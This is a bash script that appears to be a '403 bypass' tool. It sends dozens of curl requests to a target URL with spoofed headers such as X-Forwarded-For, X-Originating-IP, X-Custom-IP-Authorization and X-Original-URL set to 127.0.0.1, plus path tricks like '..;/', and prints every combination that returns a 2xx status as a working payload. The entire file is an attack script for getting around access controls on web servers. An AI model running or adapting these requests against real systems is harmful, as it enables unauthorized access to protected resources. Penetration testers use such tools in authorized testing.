#!/bin/bash

red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"

function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end}\n${payload}\n"
	fi
}

function usage(){
        printf "Usage:\n"
        printf "\t403 Bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
}

function bypass(){
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Originating-: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Originating-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'True-Client-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Destination: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Proxy: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Originating-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Remote-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-ProxyUser-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Base-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Http-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Proxy-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Redirect: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Referrer: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Request-Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forward-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-By: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-For-Original: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Server: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarder-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Http-Destinationurl: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Http-Host-Override: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Original-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

